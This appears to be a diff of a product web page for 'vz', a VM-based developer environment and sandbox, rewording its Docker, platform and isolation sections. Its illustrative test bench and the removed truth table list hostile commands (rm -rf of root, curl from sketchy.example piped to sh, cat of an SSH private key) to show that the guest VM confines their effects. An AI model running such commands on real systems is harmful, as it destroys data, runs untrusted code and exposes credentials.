         <div class="clause-b">
-          <p>The host runs a CLI, a control daemon, and thin vsock/VirtioFS plumbing. The guest runs everything else. This is not a Docker Desktop arrangement in disguise: there is no hidden VM doing unaccountable work; the VM is the product, inspectable down to its kernel config.<sup class="fn">3</sup></p>
-          <div class="statusline">Status: <span class="tag tag-active">ACTIVE</span> architectural invariant since v0.1</div>
+          <p>One stable identity owns an immutable target specification, project binding, state, resources, endpoints, and lifecycle. The daemon selects a backend from host OS, target OS, and architecture. Unsupported pairs fail explicitly; the VM, container, sandbox, or native process boundary remains an inspectable implementation detail.</p>
+          <div class="statusline">Status: <span class="tag tag-active">ACTIVE</span> backend primitives · <span class="tag tag-dev">DEV</span> unified environment aggregate</div>
         </div>
       </article>
 
       <article class="clause">
-        <div class="clause-h"><span class="cno">5.2</span>Container runtime &amp; stacks</div>
+        <div class="clause-h"><span class="cno">5.2</span>Linux target &amp; current workloads</div>
         <div class="clause-b">
-          <p>OCI images pull, run, exec, and log through <b>youki</b> executing inside the guest; the host never unpacks a layer. Compose-class stacks reconcile deterministically through vz-stack: same apply, same result, restart-safe.</p>
+          <p>On macOS, Linux workloads execute inside the selected Linux VM. OCI images pull, run, exec, and log through pinned <b>youki</b>; Compose-class stacks reconcile deterministically through vz-stack. The same Linux target contract moves next to Linux hosts and later to Windows hosts.</p>
           <pre class="cmdline"><span class="cmt"># bring a whole environment up, stream its logs, tear it down</span>
 vz stack up -f compose.yaml -n demo
 vz stack logs demo --service web --follow
@@ -628,38 +628,39 @@ vz stack down demo --volumes</pre>
       </article>
 
       <article class="clause">
-        <div class="clause-h"><span class="cno">5.3</span>Docker compatibility: the daemon lives in the guest</div>
+        <div class="clause-h"><span class="cno">5.3</span>Docker compatibility belongs to Linux</div>
         <div class="clause-b">
-          <p>Revision F's headline: run the <em>real</em> Docker inside the guest. dockerd + containerd execute in the VM on the guest kernel (MEMCG and BRIDGE_NETFILTER enabled); the host gets a unix-socket proxy over vsock. Your existing <code>docker</code> CLI, Compose, and buildx work verbatim, pointed at a daemon your Mac never ran.<sup class="fn">3</sup></p>
-          <pre class="cmdline"><span class="cmt"># nothing changes except where the daemon lives</span>
-export DOCKER_HOST=unix://$HOME/.vz/docker.sock
+          <p>Every Linux Developer Environment implicitly owns a private dockerd, containerd, BuildKit cache, images, volumes, networks, endpoint, and Docker context. The normal host Docker CLI selects that environment. No global socket, default-context mutation, Docker Desktop fallback, or cross-environment routing is allowed.</p>
+          <pre class="cmdline"><span class="cmt"># select one Linux environment explicitly</span>
+export DOCKER_CONTEXT="$(vz dev context)"
+docker ps
 docker compose up
 docker build -t app .</pre>
-          <div class="statusline">Status: <span class="tag tag-active">ACTIVE</span> vz docker shim (run/exec/ps/logs/pull/build, strict guardrails) · <span class="tag tag-planned">PLANNED</span> full dockerd-in-guest + socket proxy</div>
+          <div class="statusline">Status: <span class="tag tag-active">ACTIVE</span> guarded vz Docker shim primitives · <span class="tag tag-dev">DEV</span> implicit Engine + context + full host-client parity</div>
         </div>
       </article>
 
       <article class="clause">
-        <div class="clause-h"><span class="cno">5.4</span>Agent integration &amp; trust</div>
+        <div class="clause-h"><span class="cno">5.4</span>Native macOS target</div>
         <div class="clause-b">
-          <p>Beyond the MCP register of §4, every mutating operation emits a signed receipt; an orchestrator can reconstruct exactly what an agent did, when, and to which sandbox. Leases and events are first-class in the gRPC contract.</p>
-          <div class="statusline">Status: <span class="tag tag-active">ACTIVE</span> receipts + leases in runtime contract · <span class="tag tag-dev">DEV</span> inspection surface · <span class="tag tag-planned">PLANNED</span> MCP server</div>
+          <p>Native macOS environments reuse pinned IPSW/base images, provisioning, guest-agent execution, patching, and save/restore flows. They run Darwin and Apple toolchains in a macOS VM and do not silently create a Linux sidecar for Docker.</p>
+          <div class="statusline">Status: <span class="tag tag-active">ACTIVE</span> native VM mechanisms · <span class="tag tag-dev">DEV</span> unified Developer Environment lifecycle</div>
         </div>
       </article>
 
       <article class="clause">
-        <div class="clause-h"><span class="cno">5.5</span>Checkpoints &amp; disposability</div>
+        <div class="clause-h"><span class="cno">5.5</span>Parallelism &amp; persistence</div>
         <div class="clause-b">
-          <p>fs_quick snapshots capture workspace state in seconds; restore forks a sandbox from any checkpoint. The unit of agent experimentation becomes cheap: try the dangerous thing, restore, try again. macOS guests additionally support full save/restore VM state.</p>
-          <div class="statusline">Status: <span class="tag tag-active">ACTIVE</span> fs_quick (daemon) · <span class="tag tag-active">ACTIVE</span> macOS VM save/restore · <span class="tag tag-planned">PLANNED</span> template-from-checkpoint</div>
+          <p>Multiple environments run concurrently without sharing mutable disks, processes, sockets, ports, networks, caches, credentials, or lifecycle events. Stop preserves declared persistent state; restart reuses it; delete removes only state proven to belong to that identity.</p>
+          <div class="statusline">Status: <span class="tag tag-active">ACTIVE</span> checkpoint foundations · <span class="tag tag-dev">DEV</span> durable unified ownership and isolation gates</div>
         </div>
       </article>
 
       <article class="clause">
         <div class="clause-h"><span class="cno">5.6</span>Platform expansion</div>
         <div class="clause-b">
-          <p>Same CLI, same runtime contract, Linux hosts later: sandboxes become containers on a native kernel, no workflow rewrite. Local-first first, cloud-expandable when you need it.</p>
-          <div class="statusline">Status: <span class="tag tag-dev">DEV</span> linux-native backend (partial) · <span class="tag tag-planned">PLANNED</span> hosted Linux target</div>
+          <p>The ordered matrix is Linux-on-macOS and macOS-on-macOS now; Linux-on-Linux next; Linux-on-Windows later; and Windows-on-Windows finally. Linux remains the portable target across all three hosts, while native targets preserve their operating-system semantics.</p>
+          <div class="statusline">Status: <span class="tag tag-active">ACTIVE</span> Mac backend primitives · <span class="tag tag-dev">DEV</span> Linux-host parity · <span class="tag tag-planned">PLANNED</span> Windows host/targets</div>
         </div>
       </article>
 
@@ -671,11 +672,11 @@ docker build -t app .</pre>
   <!-- ─────────────── 6 · EVM-1: boundary test bench ─────────────── -->
   <section class="sec" aria-labelledby="bench-h">
     <div class="sec-h">
-      <h2 id="bench-h"><span class="no">6</span>Boundary test bench</h2>
-      <span class="seclabel">EVM-1 · interactive</span>
+      <h2 id="bench-h"><span class="no">6</span>Hardened profile test bench</h2>
+      <span class="seclabel">Secondary capability · illustrative</span>
     </div>
-    <p>These are the commands that keep you up at night when an agent has a shell. Select one, run it, and read the two channels the way a scope reads them: what the guest did, and what the host did.</p>
-    <div class="bench" role="group" aria-label="Boundary test bench">
+    <p>The primary Developer profile favors complete development workflows. When a workload needs stronger lockdown, the separate Hardened profile preserves the existing restricted sandbox behavior illustrated here.</p>
+    <div class="bench" role="group" aria-label="Illustrative Hardened profile boundary test bench">
       <div class="bench-h">
         <span><span class="evm">EVM-1</span> · BOUNDARY TEST BENCH · ILLUSTRATIVE</span>
         <span>CH1 GUEST · CH2 HOST</span>
@@ -695,7 +696,7 @@ docker build -t app .</pre>
         <div class="bench-read">
           <div class="cell">
             <div class="cell-h"><span>Guest console</span><span class="chan">CH1</span></div>
-            <div class="console-out" id="console-out" aria-live="polite"><span class="ps1">agent@vz-sandbox:~$</span> <span class="ps1">_</span></div>
+            <div class="console-out" id="console-out" aria-live="polite"><span class="ps1">dev@vz-hardened:~$</span> <span class="ps1">_</span></div>
           </div>
           <div class="cell">
             <div class="cell-h"><span>Guest effect</span><span class="chan">CH1</span></div>
@@ -710,9 +711,9 @@ docker build -t app .</pre>
           </div>
           <div class="cell" style="border-bottom: 0;">
             <div class="cell-h"><span>Recovery</span><span class="chan">CH1</span></div>
-            <div class="guest-out" id="recovery-out">The sandbox is disposable by design.</div>
+            <div class="guest-out" id="recovery-out">The Hardened environment can be restored or replaced.</div>
           </div>
-          <div class="recovery" id="bench-note">Mechanism note: the guest kernel mediates every effect. Declared VirtioFS mounts are the only shared bytes; <code>~/.ssh</code> is not among them. Egress policy (<span class="tag tag-planned">PLANNED</span>, §5.4) will bound the network channel the same way the VM bounds the filesystem.</div>
+          <div class="recovery" id="bench-note">Mechanism note: this demonstrates a target-qualified Hardened policy, not the default product contract. Declared shares remain explicit; credentials stay host-controlled unless a broker grants access.</div>
         </div>
       </div>
     </div>
@@ -723,49 +724,24 @@ docker build -t app .</pre>
   <!-- ─────────────── 7 · truth table ─────────────── -->
   <section class="sec truth" aria-labelledby="truth-h">
     <div class="sec-h">
-      <h2 id="truth-h"><span class="no">7</span>Truth table</h2>
-      <span class="seclabel">The specification, compressed</span>
+      <h2 id="truth-h"><span class="no">7</span>Host × target truth table</h2>
+      <span class="seclabel">Linux universal · native additive</span>
     </div>
-    <p>One table to print and tape above your desk. Whatever the agent does, column three does not change, except through the one honest, declared channel.</p>
+    <p>Support is earned per host×target pair. Linux travels across all hosts; native targets are added where their operating-system toolchains matter.</p>
     <div class="tbl-wrap">
-      <table class="tbl" aria-label="Truth table of agent inputs, guest effects, and host effects">
+      <table class="tbl" aria-label="Host and target support matrix">
         <thead>
-          <tr><th>Agent input</th><th>Guest effect (CH1)</th><th>Host effect (CH2)</th></tr>
+          <tr><th>Host</th><th>Target</th><th>Status and contract</th></tr>
         </thead>
         <tbody>
-          <tr>
-            <td class="t-mono">rm -rf /</td>
-            <td>Guest filesystem destroyed<span class="fx">sandbox dies inside the VM; kernel, host, and mounts unaffected</span></td>
-            <td class="host-none">NONE</td>
-          </tr>
-          <tr>
-            <td class="t-mono">curl … | sh</td>
-            <td>Arbitrary code as guest process, NAT egress<span class="fx">damage confined to disposable VM; egress policy PLANNED §5.4</span></td>
-            <td class="host-none">NONE</td>
-          </tr>
-          <tr>
-            <td class="t-mono">cat ~/.ssh/id_ed25519</td>
-            <td><span class="t-mono">no such file</span><span class="fx">only declared VirtioFS mounts exist in the guest</span></td>
-            <td class="host-none">NONE</td>
-          </tr>
-          <tr>
-            <td class="t-mono">apt-get install …</td>
-            <td>Guest packages, cached per setup-hash<span class="fx">persist across restarts; destroyed with the sandbox</span></td>
-            <td class="host-none">NONE</td>
-          </tr>
-          <tr>
-            <td class="t-mono">docker compose up</td>
-            <td>Full Docker in the guest<span class="fx">daemon, containers, volumes: all inside the VM, PLANNED §5.3</span></td>
-            <td class="host-none">NONE</td>
-          </tr>
-          <tr>
-            <td class="t-mono">write ./project/**</td>
-            <td>Project mount round-trips<span class="fx">the declared workspace is read-write by design</span></td>
-            <td class="host-mount">DECLARED MOUNT ONLY</td>
-          </tr>
+          <tr><td class="t-mono">macOS</td><td>Linux</td><td><span class="tag tag-active">ACTIVE</span> VM/OCI/BuildKit primitives · <span class="tag tag-dev">DEV</span> unified lifecycle and private Docker</td></tr>
+          <tr><td class="t-mono">macOS</td><td>macOS</td><td><span class="tag tag-active">ACTIVE</span> native VM flows · <span class="tag tag-dev">DEV</span> unified lifecycle</td></tr>
+          <tr><td class="t-mono">Linux</td><td>Linux</td><td><span class="tag tag-dev">DEV</span> partial native backend; parity gate pending</td></tr>
+          <tr><td class="t-mono">Windows</td><td>Linux</td><td><span class="tag tag-planned">PLANNED</span> universal Linux contract through a Windows virtualization backend</td></tr>
+          <tr><td class="t-mono">Windows</td><td>Windows</td><td><span class="tag tag-planned">PLANNED</span> native Windows target after Linux-on-Windows</td></tr>
         </tbody>
         <tfoot>
-          <tr><td colspan="3">NONE ≡ no host process, file, socket, or credential is created, read, or written outside mounts declared in the sandbox spec. Recovery from any row: <code class="t-mono">vz checkpoint</code> / <code class="t-mono">vz restore</code>, or destroy the sandbox; the host was never involved.</td></tr>
+          <tr><td colspan="3">Docker is implicit only for Linux targets. Each Linux environment owns a private Engine, containerd, BuildKit cache, images, volumes, networks, endpoint, and context. Native macOS and Windows targets do not silently start Linux.</td></tr>
         </tfoot>
       </table>
     </div>
@@ -804,8 +780,8 @@ docker build -t app .</pre>
             <td><span class="tag tag-active">ACTIVE</span></td>
           </tr>
           <tr>
-            <td class="t-mono">kernel-container</td>
-            <td>Constrained sandbox kernel: seccomp, netns, btrfs snapshots, NFS server</td>
+            <td class="t-mono">kernel-hardened</td>
+            <td>Hardened restricted profile (legacy build alias: container)</td>
             <td class="t-mono">make -C linux docker-build KERNEL_PROFILE=container</td>
             <td><span class="tag tag-active">ACTIVE</span></td>
           </tr>
@@ -841,15 +817,15 @@ docker build -t app .</pre>
           </tr>
           <tr>
             <td class="t-mono">F.1</td><td class="t-dim">in dev</td><td><span class="tag tag-dev">DEV</span></td>
-            <td>Runtime data plane: streaming exec + stdin/PTY, filesystem API, sandbox lifecycle through API/CLI, stack egress (netns MASQUERADE), Docker shim hardening</td>
+            <td>Unified Developer Environment identity/lifecycle; streaming data plane; native macOS adapter; Linux per-environment Docker, networking, storage, and isolation</td>
           </tr>
           <tr>
             <td class="t-mono">F.2</td><td class="t-dim">planned</td><td><span class="tag tag-planned">PLANNED</span></td>
-            <td>Docker in the guest: MEMCG + BRIDGE_NETFILTER kernel, dockerd/containerd provisioned in guest, unix-socket proxy over vsock, full docker CLI/Compose/buildx compat</td>
+            <td>Linux-on-macOS and macOS-on-macOS release gates; private managed Docker contexts; full Mac Docker CLI/Compose/buildx compatibility for the Linux target</td>
           </tr>
           <tr>
             <td class="t-mono">F.3</td><td class="t-dim">planned</td><td><span class="tag tag-planned">PLANNED</span></td>
-            <td>MCP server (register map §4) · egress policy + receipts surface · preview URLs (port forward) · template-from-checkpoint · Linux hosts</td>
+            <td>Linux-on-Linux parity, then Linux-on-Windows, then native Windows-on-Windows; each pairing earns separate release-built evidence</td>
           </tr>
         </tbody>
       </table>
@@ -861,11 +837,11 @@ docker build -t app .</pre>
   <section class="notes" aria-label="Notes">
     <h3>Notes</h3>
     <ol>
-      <li>Full Linux VM per sandbox on Apple Virtualization.framework; macOS 14+ (Sonoma) required for VM state save/restore.</li>
+      <li>The current Linux-on-macOS backend uses a Linux VM on Apple Virtualization.framework; native macOS environments use macOS VMs. macOS 14+ (Sonoma) is required for VM state save/restore.</li>
       <li>Boot and reuse behavior as stated in the vz repository documentation (v0.3.20): ~3 s typical cold boot to first command; setup cached by hash; warm reuse instant. Subject to the project's measured-claims policy; no independent benchmark is claimed here.</li>
-      <li>Architectural invariant: the host executes only the CLI, the vz-runtimed control daemon, and vsock/VirtioFS plumbing; every workload, including dockerd in revision F.2, executes inside the guest VM.</li>
-      <li>Agent interface register follows the vz agent-sandbox API landscape survey (MCP tool set, §7.5); MCP server implementation is PLANNED (rev F.3). Underlying primitives carry their own statuses.</li>
-      <li>Guest kernel 6.12.85, profiles <code>developer</code> (nested virt) and <code>container</code> (constrained: seccomp, netns, overlayfs, btrfs snapshots).</li>
+      <li>For Linux-on-macOS, Linux workloads—including each environment's future private dockerd—execute in the selected Linux VM. Declared host clients and bridges remain visible parts of the contract.</li>
+      <li>The lifecycle register in §4 is proposed UX. Current mechanisms retain their shipped command names while convergence is DEV.</li>
+      <li>Guest kernel 6.12.85 currently builds <code>developer</code> and legacy <code>container</code> profiles; the public restricted profile becomes <code>Hardened</code>.</li>
     </ol>
   </section>
 
@@ -892,27 +868,27 @@ docker build -t app .</pre>
     rmrf: {
       cmd: "rm -rf --no-preserve-root /",
       guest: { kind: "FILESYSTEM DESTROYED", body: "The recursive delete executes against the guest's own root. The VM's filesystem collapses; the guest agent loses the process. The VM boundary holds: outside it, the command is a string of bytes." },
-      recovery: "vz restore <checkpoint>: the workspace returns in seconds, or destroy the sandbox and boot a fresh one (~3 s)."
+      recovery: "Restore the environment checkpoint, or replace this Hardened environment from its reproducible definition."
     },
     pipe: {
       cmd: "curl http://sketchy.example | sh",
       guest: { kind: "ARBITRARY PROCESS + NAT EGRESS", body: "The script runs as a guest process with NAT egress, exactly as dangerous as it looks, and confined to a disposable machine. Egress policy (rev F.3) will bound the network channel the way the VM bounds the filesystem." },
-      recovery: "vz destroy sandbox: the process, its files, and its network state cease to exist with the VM."
+      recovery: "Delete this Hardened environment: its owned process, files, and network state are removed."
     },
     keys: {
       cmd: "cat ~/.ssh/id_ed25519",
-      guest: { kind: "NO SUCH FILE", body: "The guest sees only the mounts declared in the sandbox spec, typically /workspace. Your home directory, keychain, and secrets were never in the VM, so there is nothing to read." },
-      recovery: "Nothing to recover from, but run vz checkpoint anyway; agents that go looking for keys get the sandbox destroyed."
+      guest: { kind: "NO SUCH FILE", body: "The target sees only shares declared by the environment policy, typically /workspace. Your home directory, keychain, and secrets were never shared, so there is nothing to read." },
+      recovery: "No recovery is required. Inspect the policy and replace the Hardened environment if the attempt was unexpected."
     },
     pkg: {
       cmd: "apt-get install -y whole-toolchain",
-      guest: { kind: "GUEST PACKAGES INSTALLED", body: "Gigabytes land in the guest's persistent volume. Setup commands are cached by hash, so the toolchain survives restarts and vanishes the day you destroy the sandbox." },
-      recovery: "Nothing needed: this is the normal path. Add it to vz.json setup[] and it becomes part of the sandbox spec."
+      guest: { kind: "TARGET PACKAGES INSTALLED", body: "Packages land in this environment's persistent state. Setup commands are cached by hash, so the toolchain survives restarts and is removed when the environment is deleted." },
+      recovery: "Nothing needed: this is the normal path. Add it to vz.json setup[] so the environment remains reproducible."
     },
     dind: {
       cmd: "docker compose up --build",
       guest: { kind: "FULL DOCKER, IN THE GUEST", body: "Daemon, containers, volumes, and BuildKit all execute inside the VM on the guest kernel (rev F.2). The host contributes a client and a socket that is a proxy, nothing more." },
-      recovery: "docker compose down -v, or vz stop: the daemon and everything it built dies with the sandbox."
+      recovery: "Run docker compose down -v, stop the Linux environment while preserving state, or delete that environment and its owned Docker state."
     }
   };
 
@@ -938,7 +914,7 @@ docker build -t app .</pre>
     var c = CASES[current];
     runBtn.disabled = true;
 
-    consoleOut.innerHTML = '<span class="ps1">agent@vz-sandbox:~$</span> ';
+    consoleOut.innerHTML = '<span class="ps1">dev@vz-hardened:~$</span> ';
     var span = document.createElement("span");
     consoleOut.appendChild(span);
     guestOut.textContent = "Stimulus executing in guest…";
